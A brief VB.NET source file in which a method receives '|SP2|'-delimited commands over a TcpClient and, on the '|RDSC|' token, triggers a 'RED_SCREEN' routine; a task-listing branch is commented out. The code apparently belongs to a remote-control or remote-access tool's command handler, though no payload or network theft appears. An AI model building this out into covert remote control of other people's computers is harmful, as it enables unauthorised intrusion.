Imports System.Net.Sockets

Public Class MainCL
    Public Shared Async Sub ST(ByVal k As TcpClient, ByVal l As String)
        Dim h As String() = Split(l, "|SP2|")

        If h(1) = "|RDSC|" Then

            Await Task.Run(Sub() V1.RED_SCREEN())


            '   ElseIf h(1) = "|GETTASKSNOTOLD|" Then

            '   Await Task.Run(Sub() TasksGot(k, "|OLD|"))

        End If
    End Sub
End Class
